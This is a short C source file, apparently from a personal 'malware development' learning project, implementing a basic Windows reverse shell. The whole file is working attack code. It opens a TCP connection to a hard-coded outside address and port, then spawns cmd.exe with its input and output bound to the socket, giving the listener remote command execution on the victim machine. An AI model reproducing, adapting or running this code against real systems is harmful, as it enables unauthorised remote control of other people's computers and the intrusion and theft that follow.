//Jeet Vasudeo
//Malware development Journey
//Basic Reverse shell from Windows host

#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

int main(){

	SOCKET shell;
	sockaddr_in shell_addr;
	WSADATA wsa;
	int connection;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	char recvServer[512];
	char ip_addr[] = "192.168.2.194";
	int port = 8081;

	WSAStartup(MAKEWORD(2,2), &wsa); // init winsock for v2
	shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); //create tcp socket

	shell_addr.sin_port = htons(port);
	shell_addr.sin_family = AF_INET;
	shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

	connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
	if (connection == SOCKET_ERROR)
	{
		printf("Connection to the target server failed, try again!\n");
		exit(0);

	}


	else
	{
		//spawning a shell
		recv(shell, recvServer, sizeof(recvServer), 0); //receives con on recvServer
		memset(&si, 0, sizeof(si));
		si.cb=sizeof(si);
		si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
		si.hStdInput = si.hStdOutput = si.hStdError = HANDLE (shell); //pipe std inp, out, err to sock
		CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi); //spawn cmd
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		memset(recvServer, 0, sizeof(recvServer));


	}

	

}